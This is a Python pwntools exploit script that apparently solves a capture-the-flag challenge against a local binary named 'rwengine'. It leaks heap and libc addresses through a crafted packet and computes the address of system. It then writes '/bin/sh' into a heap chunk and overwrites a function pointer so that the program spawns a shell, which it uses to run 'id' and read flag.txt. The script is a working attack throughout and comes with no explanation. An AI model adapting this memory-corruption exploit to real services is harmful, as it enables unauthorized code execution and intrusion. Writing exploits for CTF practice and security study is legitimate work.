from pwn import *
import struct

context.log_level = 'debug'

io = process(['./ld-linux-x86-64.so.2', '--library-path', '.', './rwengine'])

def send_pkt(cmd, data=b""):
    length = len(data)
    header = struct.pack(">BH", cmd, length)
    io.send(header + data)

def recv_pkt():
    res_hdr = io.recvn(3)
    status, length = struct.unpack(">BH", res_hdr)
    resp = b""
    if length > 0:
        resp = io.recvn(length)
    return status, resp

# Step 1: Leak
spaces = b" " * 200
send_pkt(0x10, spaces)
status, resp = recv_pkt()

page_ptr = u64(resp[543:551])
toupper_addr = u64(resp[551:559])

libc = ELF("./libc.so.6")
libc_base = toupper_addr - libc.symbols['toupper']
system_addr = libc_base + libc.symbols['system']

log.info(f"libc_base: {hex(libc_base)}")
log.info(f"system_addr: {hex(system_addr)}")

# Step 2: Allocate Chunk 0 size 0x100
send_pkt(0x12, struct.pack(">H", 0x100))
status, resp = recv_pkt()
chunk0_idx = struct.unpack(">H", resp)[0]

# Step 3: Write "/bin/sh\x00" into Chunk 0
send_pkt(0x14, struct.pack(">H", chunk0_idx) + b"/bin/sh\x00")
status, resp = recv_pkt()

# Step 4: Command 0x15
send_pkt(0x15)
status, resp = recv_pkt()

# Step 5: Command 0x10 overwrite
payload = p64(0) + p64(system_addr) + p64(page_ptr)
send_pkt(0x10, payload)
status, resp = recv_pkt()

# Step 6: Command 0x16
send_pkt(0x16)

# Wait a bit and check if process is alive or crashed
time.sleep(0.5)
if io.poll() is not None:
    log.info(f"Process exited with code/signal: {io.poll()}")

io.sendline(b"echo HELLO_SHELL; id; cat flag.txt")
try:
    print("OUTPUT:", io.recvall(timeout=2))
except Exception as e:
    print("ERR:", e)
